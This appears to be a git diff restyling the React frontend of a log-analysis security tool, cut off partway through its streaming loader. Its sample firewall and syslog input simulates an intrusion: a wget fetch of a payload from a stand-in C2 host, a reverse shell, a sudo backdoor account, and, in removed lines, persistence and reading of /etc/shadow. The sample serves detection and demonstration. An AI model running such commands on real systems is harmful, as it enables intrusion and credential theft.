@@ -1,26 +1,31 @@
 /**
- * AI Threat Analyzer — Enhanced Frontend
- * Features: Live streaming · Charts · PDF export · Shareable links
- *           Tags · Search & filter · Trends dashboard · Mobile responsive
+ * AI Threat Analyzer — Production App
+ * Design: matches high-fidelity mockup
+ * Features: streaming · AI chat · multi-model compare · confidence · IOC matching
  */
 
-import { useState, useEffect, useRef, useCallback } from 'react';
+import { useState, useEffect, useRef } from 'react';
 import {
   LineChart, Line, BarChart, Bar, PieChart, Pie, Cell,
-  XAxis, YAxis, CartesianGrid, Tooltip, ResponsiveContainer, Legend,
+  XAxis, YAxis, CartesianGrid, Tooltip, ResponsiveContainer,
 } from 'recharts';
 import { supabase, getToken } from './lib/supabase.js';
 
 const API = import.meta.env.VITE_API_URL || '';
 
-// ── Severity config ───────────────────────────────────────────
-const SEV = {
-  CRITICAL:{ bg:'bg-red-500/10', border:'border-red-500/30', text:'text-red-400', dot:'bg-red-500', hex:'#ef4444' },
-  HIGH:    { bg:'bg-orange-500/10', border:'border-orange-500/30', text:'text-orange-400', dot:'bg-orange-500', hex:'#f97316' },
-  MEDIUM:  { bg:'bg-amber-500/10', border:'border-amber-500/30', text:'text-amber-400', dot:'bg-amber-500', hex:'#f59e0b' },
-  LOW:     { bg:'bg-emerald-500/10', border:'border-emerald-500/30', text:'text-emerald-400', dot:'bg-emerald-500', hex:'#10b981' },
+// ── Design tokens matching mockup ────────────────────────────
+const COLORS = {
+  primary:   '#185FA5',
+  primaryLt: '#E6F1FB',
+  danger:    '#A32D2D',
+  dangerLt:  '#FCEBEB',
+  warning:   '#854F0B',
+  warningLt: '#FAEEDA',
+  success:   '#3B6D11',
+  successLt: '#EAF3DE',
+  footer:    '#2C3E50',
+  border:    'rgba(0,0,0,0.1)',
 };
-const getSev = (l) => SEV[(l||'').toUpperCase()] || { bg:'bg-slate-800', border:'border-slate-700', text:'text-slate-400', dot:'bg-slate-500', hex:'#64748b' };
 
 const MITRE_TACTICS = [
   'Reconnaissance','Resource Dev','Initial Access','Execution',
@@ -28,25 +33,50 @@ const MITRE_TACTICS = [
   'Discovery','Lateral Movement','Collection','C2','Exfiltration','Impact',
 ];
 
-const PRESET_TAGS = ['APT','Ransomware','Phishing','Malware','Insider','Exfiltration','Lateral Movement','Zero Day','Scripted','Brute Force'];
+const PRESET_TAGS = ['APT','Ransomware','Phishing','Malware','Insider','Exfiltration','Lateral Movement','Zero Day','Brute Force'];
+
+// Risk helpers
+function riskColor(score) {
+  if (score >= 70) return COLORS.danger;
+  if (score >= 40) return COLORS.warning;
+  return COLORS.success;
+}
+function riskBg(score) {
+  if (score >= 70) return COLORS.dangerLt;
+  if (score >= 40) return COLORS.warningLt;
+  return COLORS.successLt;
+}
+function riskLabel(score) {
+  if (score >= 70) return 'Critical';
+  if (score >= 40) return 'Medium';
+  return 'Low';
+}
+function sevColor(sev) {
+  const s = (sev||'').toUpperCase();
+  if (s==='CRITICAL') return COLORS.danger;
+  if (s==='HIGH') return '#993C1D';
+  if (s==='MEDIUM') return COLORS.warning;
+  return COLORS.success;
+}
+function sevBg(sev) {
+  const s = (sev||'').toUpperCase();
+  if (s==='CRITICAL') return COLORS.dangerLt;
+  if (s==='HIGH') return '#FAECE7';
+  if (s==='MEDIUM') return COLORS.warningLt;
+  return COLORS.successLt;
+}
 
 const SAMPLE = `2024-01-15 02:14:33 FIREWALL DENY  src=185.220.101.47  dst=10.0.1.5   port=22   proto=TCP  count=847
-2024-01-15 02:14:33 FIREWALL DENY  src=185.220.101.47  dst=10.0.1.5   port=3389 proto=TCP  count=312
 2024-01-15 02:18:47 SSH FAIL   src=185.220.101.47  user=admin  dst=10.0.1.5
-2024-01-15 02:18:49 SSH FAIL   src=185.220.101.47  user=root   dst=10.0.1.5
 2024-01-15 02:19:22 SSH SUCCESS src=185.220.101.47 user=deploy dst=10.0.1.5 session=44291
 2024-01-15 02:19:28 PROCESS pid=9934 user=deploy cmd="wget http://malware-c2.ru/stage2.sh -O /tmp/.hidden_update"
 2024-01-15 02:19:28 DNS QUERY src=10.0.1.5 query=malware-c2.ru type=A response=91.108.4.14
-2024-01-15 02:19:32 PROCESS pid=9945 user=deploy cmd="chmod +x /tmp/.hidden_update && /tmp/.hidden_update"
 2024-01-15 02:19:33 SYSLOG WARN msg="Privilege escalation via CVE-2023-0386 process gained root"
 2024-01-15 02:19:35 NETWORK dst=91.108.4.14 src=10.0.1.5 port=4444 state=ESTABLISHED msg="Reverse shell"
-2024-01-15 02:19:36 FILE MODIFY path=/etc/crontab change="Added persistence entry"
 2024-01-15 02:19:38 PROCESS user=root cmd="useradd -m -s /bin/bash -G sudo svc_backup"
-2024-01-15 02:19:40 PROCESS user=root cmd="cat /etc/shadow | base64"
 2024-01-15 02:20:03 SSH SUCCESS src=10.0.1.5 user=ubuntu dst=10.0.1.12 msg="Lateral movement"
 2024-01-15 02:21:19 NETWORK dst=91.108.4.14 src=10.0.1.12 port=443 bytes=94732180 msg="90.3MB exfiltrated"`;
 
-// ── API helpers ───────────────────────────────────────────────
 async function apiFetch(path, opts = {}) {
   const token = await getToken();
   const res = await fetch(`${API}${path}`, {
@@ -62,125 +92,192 @@ async function apiFetch(path, opts = {}) {
   return data;
 }
 
-// ── Check URL for shared report ───────────────────────────────
-function getSharedIdFromUrl() {
-  const params = new URLSearchParams(window.location.search);
-  return params.get('r') || null;
+function getSharedId() {
+  return new URLSearchParams(window.location.search).get('r') || null;
 }
 
 // ══════════════════════════════════════════════════════════════
-// SHARED UI COMPONENTS
+// DESIGN COMPONENTS
 // ══════════════════════════════════════════════════════════════
 
-function Badge({ level, className = '' }) {
-  const s = getSev(level);
+// Shield logo — matches mockup
+function ShieldLogo({ size = 28 }) {
   return (
-    <span className={`inline-flex items-center gap-1.5 px-2.5 py-0.5 rounded-md text-xs font-semibold border ${s.bg} ${s.border} ${s.text} ${className}`}>
-      <span className={`w-1.5 h-1.5 rounded-full ${s.dot}`} />
-      {(level || 'UNKNOWN').toUpperCase()}
+    <svg width={size} height={size} viewBox="0 0 28 28" fill="none">
+      <path d="M14 3L4 7v8c0 5.5 4.3 10.7 10 12 5.7-1.3 10-6.5 10-12V7L14 3z"
+        fill={COLORS.primary} fillOpacity="0.15" stroke={COLORS.primary} strokeWidth="1.5" />
+      <path d="M10 14l3 3 5-5" stroke={COLORS.primary} strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" />
+    </svg>
+  );
+}
+
+// Network node hero background SVG
+function NetworkBg() {
+  return (
+    <svg style={{ position:'absolute', top:0, right:0, opacity:0.06, pointerEvents:'none', zIndex:0 }}
+      width="420" height="320" viewBox="0 0 420 320" fill="none">
+      {[[60,80],[160,40],[280,90],[360,30],[200,160],[320,200],[80,200],[400,140],[140,260],[380,280],[240,300]].map(([x,y],i) => (
+        <circle key={i} cx={x} cy={y} r="4" fill={COLORS.primary} />
+      ))}
+      {[[60,80,160,40],[160,40,280,90],[280,90,360,30],[160,40,200,160],[280,90,200,160],[200,160,320,200],[80,200,200,160],[320,200,400,140],[80,200,140,260],[320,200,380,280],[140,260,240,300],[240,300,380,280]].map(([x1,y1,x2,y2],i) => (
+        <line key={i} x1={x1} y1={y1} x2={x2} y2={y2} stroke={COLORS.primary} strokeWidth="0.8" />
+      ))}
+    </svg>
+  );
+}
+
+// Severity badge — matches mockup pill style
+function SevBadge({ level, score }) {
+  const label = score !== undefined ? riskLabel(score) : (level || '');
+  const color = score !== undefined ? riskColor(score) : sevColor(level);
+  const bg    = score !== undefined ? riskBg(score)    : sevBg(level);
+  return (
+    <span style={{ display:'inline-flex', alignItems:'center', gap:4, fontSize:11, fontWeight:500,
+      padding:'2px 8px', borderRadius:99, background:bg, color }}>
+      <span style={{ width:6, height:6, borderRadius:'50%', background:color, display:'inline-block' }} />
+      {label}
     </span>
   );
 }
 
-function Card({ children, className = '' }) {
+// Threat score card — main visual from mockup
+function ThreatCard({ title, score, bullets = [], model }) {
+  const color = riskColor(score);
+  const bg    = riskBg(score);
   return (
-    <div className={`bg-[#0f1117] border border-white/[0.06] rounded-2xl ${className}`}>
-      {children}
-    </div>
-  );
-}
-
-function ScoreRing({ score }) {
-  const r = 48, c = 2 * Math.PI * r;
-  const fill = ((score || 0) / 100) * c;
-  const color = score >= 80 ? '#ef4444' : score >= 60 ? '#f97316' : score >= 40 ? '#f59e0b' : '#10b981';
-  const label = score >= 80 ? 'CRITICAL' : score >= 60 ? 'HIGH' : score >= 40 ? 'MEDIUM' : 'LOW';
-  return (
-    <div className="flex flex-col items-center gap-2">
-      <div className="relative">
-        <svg width="120" height="120" viewBox="0 0 120 120">
-          <circle cx="60" cy="60" r={r} fill="none" stroke="rgba(255,255,255,0.05)" strokeWidth="8" />
-          <circle cx="60" cy="60" r={r} fill="none" stroke={color} strokeWidth="8"
-            strokeLinecap="round" strokeDasharray={`${fill} ${c}`}
-            transform="rotate(-90 60 60)"
-            style={{ transition:'stroke-dasharray 1.2s ease', filter:`drop-shadow(0 0 6px ${color}88)` }} />
-        </svg>
-        <div className="absolute inset-0 flex flex-col items-center justify-center">
-          <span className="text-2xl font-black" style={{ color }}>{score}</span>
-          <span className="text-xs text-slate-500">/ 100</span>
+    <div style={{ background:'#fff', border:`0.5px solid ${COLORS.border}`, borderRadius:12, padding:20 }}>
+      <div style={{ display:'flex', alignItems:'flex-start', justifyContent:'space-between', marginBottom:16 }}>
+        <div>
+          <p style={{ fontSize:12, color:'#888', marginBottom:4, textTransform:'uppercase', letterSpacing:'0.06em' }}>Threat score</p>
+          <span style={{ fontSize:48, fontWeight:500, lineHeight:1, color }}>{score}</span>
+          <span style={{ fontSize:13, color:'#aaa', marginLeft:4 }}>/ 100</span>
         </div>
+        <SevBadge score={score} />
       </div>
-      <span className={`text-[10px] font-bold tracking-widest uppercase ${getSev(label).text}`}>{label}</span>
+      <div style={{ height:4, background:bg, borderRadius:2, marginBottom:16 }}>
+        <div style={{ width:`${score}%`, height:'100%', background:color, borderRadius:2, transition:'width 0.8s ease' }} />
+      </div>
+      <p style={{ fontSize:13, fontWeight:500, marginBottom:10, color:'#1a1a2e' }}>{title}</p>
+      <ul style={{ fontSize:13, color:'#555', lineHeight:1.8, listStyle:'none', padding:0 }}>
+        {bullets.map((b, i) => (
+          <li key={i} style={{ display:'flex', gap:8, alignItems:'baseline' }}>
+            <span style={{ color, fontSize:16, lineHeight:1 }}>•</span>{b}
+          </li>
+        ))}
+      </ul>
+      {model && <p style={{ fontSize:11, color:'#aaa', marginTop:10 }}>Model: {model}</p>}
     </div>
   );
 }
 
-function MitreMatrix({ mappings = [] }) {
-  const byTactic = {};
-  mappings.forEach(m => { if (!byTactic[m.tactic]) byTactic[m.tactic] = []; byTactic[m.tactic].push(m); });
+// IOC pill
+function IOCPill({ label, value, type = 'danger' }) {
+  const colors = {
+    danger:  [COLORS.dangerLt,  COLORS.danger],
+    warning: [COLORS.warningLt, COLORS.warning],
+    info:    [COLORS.primaryLt, COLORS.primary],
+  }[type] || [COLORS.dangerLt, COLORS.danger];
   return (
-    <div className="flex gap-1.5 min-w-max">
-      {MITRE_TACTICS.map(tactic => {
-        const hits = byTactic[tactic] || [];
-        const active = hits.length > 0;
-        return (
-          <div key={tactic} className="w-[68px] flex-shrink-0">
-            <div className={`text-center px-1 py-2 rounded-t-lg leading-tight ${active ? 'bg-blue-600/20 text-blue-300 border border-blue-600/30 border-b-0' : 'bg-white/[0.03] text-slate-600 border border-white/[0.06] border-b-0'}`}
-              style={{ fontSize:'9px', fontWeight:600 }}>{tactic}</div>
-            <div className={`min-h-8 p-1 space-y-1 rounded-b-lg border border-t-0 ${active ? 'bg-blue-600/10 border-blue-600/30' : 'bg-white/[0.02] border-white/[0.06]'}`}>
-              {hits.map((h,i) => (
-                <div key={i} title={`${h.name} — ${h.confidence}%`}
-                  className="text-center py-0.5 rounded cursor-help bg-blue-500/20 text-blue-300 border border-blue-500/20"
-                  style={{ fontSize:'9px', fontFamily:'monospace', fontWeight:600 }}>
-                  {h.technique}
-                </div>
-              ))}
-            </div>
-          </div>
-        );
-      })}
+    <div style={{ display:'flex', alignItems:'center', gap:6 }}>
+      <span style={{ fontSize:11, color:'#888' }}>{label}</span>
+      <code style={{ fontSize:11, background:colors[0], color:colors[1], padding:'2px 8px', borderRadius:4, fontFamily:'monospace' }}>
+        {value}
+      </code>
     </div>
   );
 }
 
+// Code block — matches mockup
+function CodeBlock({ lines = [], pills = [], title, badge }) {
+  const [copied, setCopied] = useState(false);
+  function copy() {
+    navigator.clipboard.writeText(lines.join('\n'));
+    setCopied(true);
+    setTimeout(() => setCopied(false), 2000);
+  }
+  return (
+    <div style={{ background:'#fff', border:`0.5px solid ${COLORS.border}`, borderRadius:12, padding:20 }}>
+      <div style={{ display:'flex', alignItems:'center', justifyContent:'space-between', marginBottom:14, flexWrap:'wrap', gap:8 }}>
+        <div style={{ display:'flex', alignItems:'center', gap:10 }}>
+          {title && <p style={{ fontSize:13, fontWeight:500, color:'#1a1a2e' }}>{title}</p>}
+          {badge && <span style={{ fontSize:11, fontWeight:500, padding:'2px 8px', borderRadius:99, background:COLORS.dangerLt, color:COLORS.danger }}>{badge}</span>}
+        </div>
+        <button onClick={copy} style={{ background:'transparent', border:`0.5px solid ${COLORS.border}`, borderRadius:8,
+          padding:'5px 10px', fontSize:12, cursor:'pointer', color:'#555', display:'flex', alignItems:'center', gap:5 }}>
+          <svg width="12" height="12" viewBox="0 0 16 16" fill="none">
+            <rect x="5" y="5" width="9" height="9" rx="1.5" stroke="currentColor" strokeWidth="1.5" />
+            <path d="M11 5V3a1 1 0 00-1-1H3a1 1 0 00-1 1v7a1 1 0 001 1h2" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" />
+          </svg>
+          {copied ? 'Copied!' : 'Copy'}
+        </button>
+      </div>
+      <pre style={{ background:'#F5F7FA', border:`0.5px solid ${COLORS.border}`, borderRadius:8, padding:16,
+        fontSize:12, overflowX:'auto', lineHeight:1.7, margin:0, color:'#1a1a2e', fontFamily:'monospace' }}>
+        <code>{lines.join('\n')}</code>
+      </pre>
+      {pills.length > 0 && (
+        <div style={{ display:'flex', gap:16, marginTop:14, flexWrap:'wrap' }}>
+          {pills.map((p, i) => <IOCPill key={i} {...p} />)}
+        </div>
+      )}
+    </div>
+  );
+}
+
+// Confidence bar
+function ConfBar({ value, label }) {
+  const color = value >= 80 ? COLORS.success : value >= 60 ? COLORS.primary : value >= 40 ? COLORS.warning : COLORS.danger;
+  return (
+    <div style={{ display:'flex', alignItems:'center', gap:8 }}>
+      {label && <span style={{ fontSize:12, color:'#888', width:70, flexShrink:0 }}>{label}</span>}
+      <div style={{ flex:1, height:4, background:'#eee', borderRadius:2, overflow:'hidden' }}>
+        <div style={{ width:`${value||0}%`, height:'100%', background:color, borderRadius:2, transition:'width 0.7s ease' }} />
+      </div>
+      <span style={{ fontSize:12, fontWeight:500, color, width:36, textAlign:'right', flexShrink:0, fontFamily:'monospace' }}>{value||0}%</span>
+    </div>
+  );
+}
+
+// Toast notification
 function Toast({ message, type, onClose }) {
   useEffect(() => { const t = setTimeout(onClose, 4000); return () => clearTimeout(t); }, []);
-  const s = { success:'bg-emerald-500/10 border-emerald-500/30 text-emerald-300', error:'bg-red-500/10 border-red-500/30 text-red-300', info:'bg-blue-500/10 border-blue-500/30 text-blue-300' };
+  const bg = type==='success' ? COLORS.successLt : type==='error' ? COLORS.dangerLt : COLORS.primaryLt;
+  const color = type==='success' ? COLORS.success : type==='error' ? COLORS.danger : COLORS.primary;
   return (
-    <div className={`fixed top-4 right-4 z-50 flex items-center gap-3 px-4 py-3 rounded-xl border text-sm max-w-sm shadow-2xl animate-fadeIn ${s[type]||s.info}`}>
+    <div style={{ position:'fixed', top:16, right:16, zIndex:1000, display:'flex', alignItems:'center', gap:12,
+      padding:'12px 16px', borderRadius:12, border:`0.5px solid ${color}33`, background:bg, color,
+      fontSize:14, maxWidth:360, boxShadow:'0 4px 12px rgba(0,0,0,0.1)' }}>
       <span>{type==='success'?'✓':type==='error'?'✗':'ℹ'}</span>
-      <span className="flex-1">{message}</span>
-      <button onClick={onClose} className="opacity-40 hover:opacity-100 ml-1 text-lg leading-none">×</button>
+      <span style={{ flex:1 }}>{message}</span>
+      <button onClick={onClose} style={{ background:'none', border:'none', cursor:'pointer', color, fontSize:18, lineHeight:1, padding:0 }}>×</button>
     </div>
   );
 }
 
-// ── Tag editor ────────────────────────────────────────────────
+// Tag editor
 function TagEditor({ scanId, initialTags = [], onUpdate }) {
   const [tags, setTags] = useState(initialTags);
   const [saving, setSaving] = useState(false);
-
   async function toggle(tag) {
     const next = tags.includes(tag) ? tags.filter(t => t !== tag) : [...tags, tag];
-    setTags(next);
-    setSaving(true);
-    try {
-      await apiFetch(`/api/scans/${scanId}/tags`, { method:'PATCH', body:JSON.stringify({ tags:next }) });
-      onUpdate?.(next);
-    } catch (_) {}
-    setSaving(false);
+    setTags(next); setSaving(true);
+    try { await apiFetch(`/api/scans/${scanId}/tags`, { method:'PATCH', body:JSON.stringify({ tags:next }) }); onUpdate?.(next); }
+    catch(_) {} setSaving(false);
   }
-
   return (
     <div>
-      <div className="flex items-center gap-2 mb-2">
-        <span className="text-xs text-slate-500 uppercase tracking-wider">Tags</span>
-        {saving && <span className="text-xs text-slate-600 animate-pulse">saving…</span>}
+      <div style={{ display:'flex', alignItems:'center', gap:8, marginBottom:10 }}>
+        <span style={{ fontSize:12, color:'#888', textTransform:'uppercase', letterSpacing:'0.06em' }}>Labels</span>
+        {saving && <span style={{ fontSize:11, color:'#aaa' }}>saving…</span>}
       </div>
-      <div className="flex flex-wrap gap-1.5">
+      <div style={{ display:'flex', flexWrap:'wrap', gap:6 }}>
         {PRESET_TAGS.map(tag => (
           <button key={tag} onClick={() => toggle(tag)}
-            className={`px-2.5 py-1 rounded-lg text-xs font-medium border transition-all ${tags.includes(tag) ? 'bg-blue-600/20 border-blue-500/40 text-blue-300' : 'bg-white/[0.03] border-white/[0.06] text-slate-500 hover:text-slate-300 hover:border-white/20'}`}>
+            style={{ padding:'4px 12px', borderRadius:99, fontSize:12, fontWeight:500, cursor:'pointer',
+              border:`0.5px solid ${tags.includes(tag) ? COLORS.primary : COLORS.border}`,
+              background: tags.includes(tag) ? COLORS.primaryLt : 'transparent',
+              color: tags.includes(tag) ? COLORS.primary : '#555',
+              transition:'all 0.15s' }}>
             {tag}
           </button>
         ))}
@@ -189,241 +286,173 @@ function TagEditor({ scanId, initialTags = [], onUpdate }) {
   );
 }
 
-// ── Share button ──────────────────────────────────────────────
-function ShareButton({ scanId, isPublic: initialPublic, onToast }) {
-  const [isPublic, setIsPublic] = useState(initialPublic || false);
+// Share button
+function ShareBtn({ scanId, isPublic:init, onToast }) {
+  const [isPublic, setIsPublic] = useState(init || false);
   const [loading, setLoading] = useState(false);
-
   async function toggle() {
     setLoading(true);
     try {
-      const data = await apiFetch(`/api/scans/${scanId}/share`, { method:'PATCH' });
-      setIsPublic(data.is_public);
-      if (data.is_public) {
-        const url = `${window.location.origin}?r=${scanId}`;
-        await navigator.clipboard.writeText(url);
-        onToast('Link copied to clipboard!', 'success');
-      } else {
-        onToast('Report is now private.', 'info');
-      }
-    } catch (err) { onToast(err.message, 'error'); }
+      const d = await apiFetch(`/api/scans/${scanId}/share`, { method:'PATCH' });
+      setIsPublic(d.is_public);
+      if (d.is_public) { await navigator.clipboard.writeText(`${window.location.origin}?r=${scanId}`); onToast('Shareable link copied!', 'success'); }
+      else onToast('Report is now private.', 'info');
+    } catch(e) { onToast(e.message, 'error'); }
     setLoading(false);
   }
-
-  async function copyLink() {
-    const url = `${window.location.origin}?r=${scanId}`;
-    await navigator.clipboard.writeText(url);
-    onToast('Link copied!', 'success');
-  }
-
+  async function copy() { await navigator.clipboard.writeText(`${window.location.origin}?r=${scanId}`); onToast('Link copied!', 'success'); }
   return (
-    <div className="flex items-center gap-2">
+    <div style={{ display:'flex', gap:6 }}>
       <button onClick={toggle} disabled={loading}
-        className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-medium border transition-all ${isPublic ? 'bg-emerald-500/10 border-emerald-500/30 text-emerald-400' : 'bg-white/[0.03] border-white/[0.06] text-slate-400 hover:text-white'}`}>
+        style={{ display:'flex', alignItems:'center', gap:6, padding:'6px 12px', borderRadius:8, fontSize:12, fontWeight:500, cursor:'pointer',
+          border:`0.5px solid ${isPublic ? COLORS.success : COLORS.border}`,
+          background: isPublic ? COLORS.successLt : 'transparent',
+          color: isPublic ? COLORS.success : '#555' }}>
         {loading ? '…' : isPublic ? '🔗 Public' : '🔒 Private'}
       </button>
       {isPublic && (
-        <button onClick={copyLink} className="flex items-center gap-1 px-2.5 py-1.5 rounded-lg text-xs bg-white/[0.03] border border-white/[0.06] text-slate-400 hover:text-white transition-colors">
-          Copy Link
+        <button onClick={copy} style={{ padding:'6px 12px', borderRadius:8, fontSize:12, cursor:'pointer',
+          border:`0.5px solid ${COLORS.border}`, background:'transparent', color:'#555' }}>
+          Copy link
         </button>
       )}
     </div>
   );
 }
 
-// ── PDF export ────────────────────────────────────────────────
-function PDFButton() {
-  function handlePrint() {
-    window.print();
-  }
+// IOC matches banner
+function IOCBanner({ scanId }) {
+  const [matches, setMatches] = useState([]);
+  const [loaded, setLoaded] = useState(false);
+  useEffect(() => {
+    if (!scanId) { setLoaded(true); return; }
+    apiFetch(`/api/scans/${scanId}/matches`).then(d => setMatches(d.matches||[])).catch(()=>{}).finally(()=>setLoaded(true));
+  }, [scanId]);
+  if (!loaded || matches.length === 0) return null;
   return (
-    <button onClick={handlePrint}
-      className="no-print flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-medium bg-white/[0.03] border border-white/[0.06] text-slate-400 hover:text-white hover:bg-white/[0.06] transition-all">
-      📄 Export PDF
-    </button>
+    <div style={{ background:COLORS.warningLt, border:`0.5px solid ${COLORS.warning}44`, borderRadius:12, padding:16, marginBottom:16 }}>
+      <div style={{ display:'flex', gap:12, alignItems:'flex-start' }}>
+        <span style={{ fontSize:20, flexShrink:0 }}>🔁</span>
+        <div style={{ flex:1 }}>
+          <p style={{ fontWeight:500, fontSize:13, color:COLORS.warning, marginBottom:4 }}>
+            {matches.length} repeat IOC{matches.length>1?'s':''} detected — possible persistent threat
+          </p>
+          <div style={{ display:'flex', flexDirection:'column', gap:6, marginTop:8 }}>
+            {matches.map((m,i) => (
+              <div key={i} style={{ display:'flex', alignItems:'center', gap:8, background:'rgba(255,255,255,0.6)', borderRadius:8, padding:'6px 10px' }}>
+                <code style={{ fontSize:11, background:COLORS.warningLt, color:COLORS.warning, padding:'2px 8px', borderRadius:4 }}>{m.ioc_type}</code>
+                <code style={{ fontSize:11, color:COLORS.warning, flex:1, overflow:'hidden', textOverflow:'ellipsis', whiteSpace:'nowrap' }}>{m.ioc_value}</code>
+                <span style={{ fontSize:11, color:COLORS.warning, flexShrink:0 }}>
+                  Seen {m.hit_count}× · first {new Date(m.first_seen).toLocaleDateString('en-IN')}
+                </span>
+              </div>
+            ))}
+          </div>
+        </div>
+      </div>
+    </div>
   );
 }
 
-// ══════════════════════════════════════════════════════════════
-// CHARTS
-// ══════════════════════════════════════════════════════════════
-
-const CHART_COLORS = ['#ef4444','#f97316','#f59e0b','#10b981'];
-
-function SeverityPieChart({ scans }) {
-  const data = ['CRITICAL','HIGH','MEDIUM','LOW'].map((sev, i) => ({
-    name: sev,
-    value: scans.filter(s => s.severity === sev).length,
-    color: CHART_COLORS[i],
-  })).filter(d => d.value > 0);
-
-  if (data.length === 0) return <div className="flex items-center justify-center h-40 text-slate-600 text-sm">No data yet</div>;
-
+// MITRE matrix
+function MitreMatrix({ mappings = [] }) {
+  const byTactic = {};
+  mappings.forEach(m => { if (!byTactic[m.tactic]) byTactic[m.tactic]=[]; byTactic[m.tactic].push(m); });
   return (
-    <ResponsiveContainer width="100%" height={180}>
-      <PieChart>
-        <Pie data={data} cx="50%" cy="50%" innerRadius={45} outerRadius={70} paddingAngle={3} dataKey="value">
-          {data.map((entry, i) => <Cell key={i} fill={entry.color} opacity={0.85} />)}
-        </Pie>
-        <Tooltip
-          contentStyle={{ background:'#0f1117', border:'1px solid rgba(255,255,255,0.1)', borderRadius:'8px', fontSize:'12px' }}
-          labelStyle={{ color:'#94a3b8' }} itemStyle={{ color:'#e2e8f0' }} />
-        <Legend iconType="circle" iconSize={8} formatter={(v) => <span style={{ color:'#94a3b8', fontSize:'11px' }}>{v}</span>} />
-      </PieChart>
-    </ResponsiveContainer>
+    <div style={{ overflowX:'auto', paddingBottom:4 }}>
+      <div style={{ display:'flex', gap:6, minWidth:'max-content' }}>
+        {MITRE_TACTICS.map(tactic => {
+          const hits = byTactic[tactic]||[], active=hits.length>0;
+          return (
+            <div key={tactic} style={{ width:68, flexShrink:0 }}>
+              <div style={{ textAlign:'center', padding:'6px 2px', fontSize:9, fontWeight:600, lineHeight:1.2, borderRadius:'6px 6px 0 0',
+                background: active ? `${COLORS.primary}20` : '#F5F7FA',
+                color: active ? COLORS.primary : '#aaa',
+                border: active ? `0.5px solid ${COLORS.primary}44` : `0.5px solid ${COLORS.border}`,
+                borderBottom:'none' }}>
+                {tactic}
+              </div>
+              <div style={{ minHeight:32, padding:3, display:'flex', flexDirection:'column', gap:2, borderRadius:'0 0 6px 6px',
+                background: active ? `${COLORS.primary}08` : '#fafafa',
+                border: active ? `0.5px solid ${COLORS.primary}44` : `0.5px solid ${COLORS.border}`,
+                borderTop:'none' }}>
+                {hits.map((h,i) => (
+                  <div key={i} title={`${h.name} — ${h.confidence}%${h.evidence ? '\n'+h.evidence : ''}`}
+                    style={{ textAlign:'center', padding:'2px 0', borderRadius:3, cursor:'help', fontSize:9,
+                      background:`${COLORS.primary}20`, color:COLORS.primary, fontFamily:'monospace', fontWeight:600,
+                      border:`0.5px solid ${COLORS.primary}30` }}>
+                    {h.technique}
+                  </div>
+                ))}
+              </div>
+            </div>
+          );
+        })}
+      </div>
+    </div>
   );
 }
 
-function RiskLineChart({ scans }) {
-  const data = [...scans].reverse().slice(-15).map((s, i) => ({
-    name: `#${i+1}`,
-    score: s.risk_score || 0,
-    date: new Date(s.created_at).toLocaleDateString('en-IN', { day:'numeric', month:'short' }),
-  }));
-
-  if (data.length < 2) return <div className="flex items-center justify-center h-40 text-slate-600 text-sm">Need 2+ scans</div>;
-
-  return (
-    <ResponsiveContainer width="100%" height={180}>
-      <LineChart data={data} margin={{ top:5, right:10, left:-20, bottom:5 }}>
-        <CartesianGrid strokeDasharray="3 3" stroke="rgba(255,255,255,0.05)" />
-        <XAxis dataKey="name" tick={{ fill:'#64748b', fontSize:10 }} axisLine={false} tickLine={false} />
-        <YAxis domain={[0,100]} tick={{ fill:'#64748b', fontSize:10 }} axisLine={false} tickLine={false} />
-        <Tooltip
-          contentStyle={{ background:'#0f1117', border:'1px solid rgba(255,255,255,0.1)', borderRadius:'8px', fontSize:'12px' }}
-          labelStyle={{ color:'#94a3b8' }}
-          formatter={(v) => [v, 'Risk Score']}
-          labelFormatter={(_, payload) => payload?.[0]?.payload?.date || ''} />
-        <Line type="monotone" dataKey="score" stroke="#3b82f6" strokeWidth={2} dot={{ fill:'#3b82f6', r:3 }} activeDot={{ r:5 }} />
-      </LineChart>
-    </ResponsiveContainer>
-  );
-}
-
-function DailyScanChart({ scans }) {
-  const last7 = Array.from({ length: 7 }, (_, i) => {
-    const d = new Date();
-    d.setDate(d.getDate() - (6 - i));
-    const key = d.toISOString().split('T')[0];
-    const label = d.toLocaleDateString('en-IN', { weekday:'short' });
-    return {
-      day: label,
-      count: scans.filter(s => s.created_at?.startsWith(key)).length,
-    };
-  });
-
-  return (
-    <ResponsiveContainer width="100%" height={180}>
-      <BarChart data={last7} margin={{ top:5, right:10, left:-20, bottom:5 }}>
-        <CartesianGrid strokeDasharray="3 3" stroke="rgba(255,255,255,0.05)" />
-        <XAxis dataKey="day" tick={{ fill:'#64748b', fontSize:10 }} axisLine={false} tickLine={false} />
-        <YAxis allowDecimals={false} tick={{ fill:'#64748b', fontSize:10 }} axisLine={false} tickLine={false} />
-        <Tooltip
-          contentStyle={{ background:'#0f1117', border:'1px solid rgba(255,255,255,0.1)', borderRadius:'8px', fontSize:'12px' }}
-          labelStyle={{ color:'#94a3b8' }}
-          formatter={(v) => [v, 'Scans']} />
-        <Bar dataKey="count" fill="#3b82f6" opacity={0.8} radius={[4,4,0,0]} />
-      </BarChart>
-    </ResponsiveContainer>
-  );
-}
-
-// ══════════════════════════════════════════════════════════════
-// STREAMING ANALYSIS
-// ══════════════════════════════════════════════════════════════
-
-function StreamingAnalysis({ input, file, onComplete, onError }) {
+// Streaming analysis loader
+function StreamLoader({ input, onComplete, onError }) {
   const [chunks, setChunks] = useState('');
-  const [status, setStatus] = useState('connecting');
+  const [status, setStatus] = useState('streaming');
   const bottomRef = useRef();
 
   useEffect(() => {
     (async () => {
-      setStatus('streaming');
       try {
         const token = await getToken();
-        const headers = { 'Content-Type': 'application/json' };
-        if (token) headers['Authorization'] = `Bearer ${token}`;
-
         const res = await fetch(`${API}/api/analyze/stream`, {
-          method: 'POST',
-          headers,
-          body: JSON.stringify({ input: input || '' }),
+          method:'POST',
+          headers:{ 'Content-Type':'application/json', ...(token?{Authorization:`Bearer ${token}`}:{}) },
+          body: JSON.stringify({ input }),
         });
-
-        if (!res.ok) {
-          const err = await res.json();
-          throw new Error(err.error || 'Stream failed');
-        }
-
-        const reader = res.body.getReader();
-        const decoder = new TextDecoder();
-        let buffer = '';
-
-        while (true) {
-          const { done, value } = await reader.read();
-          if (done) break;
-          buffer += decoder.decode(value, { stream: true });
-          const lines = buffer.split('\n');
-          buffer = lines.pop();
